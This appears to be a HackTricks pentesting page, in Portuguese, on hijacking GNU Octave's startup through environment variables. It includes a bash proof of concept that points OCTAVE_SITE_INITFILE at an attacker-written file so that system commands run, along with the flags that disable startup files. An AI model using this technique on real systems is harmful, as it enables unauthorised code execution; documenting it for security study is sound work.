# Injeção em Aplicações GNU Octave

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

O GNU Octave executa vários arquivos contendo comandos Octave válidos durante a inicialização. `OCTAVE_SITE_INITFILE` substitui o arquivo de inicialização abrangente do site, e `OCTAVE_VERSION_INITFILE` substitui o específico da versão, permitindo que qualquer uma das variáveis redirecione a execução automática para um arquivo legível pelo atacante.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` apenas ignora arquivos do usuário, como `~/.octaverc`; ele **não** interrompe a substituição do site-file acima. Use `--no-site-file` para os site files ou `--norc` / `-f` para desabilitar todos os arquivos de inicialização.<sup>[[2]](#references)</sup>

## References

- [1] [Arquivos de inicialização do GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [2] [Opções de linha de comando do GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
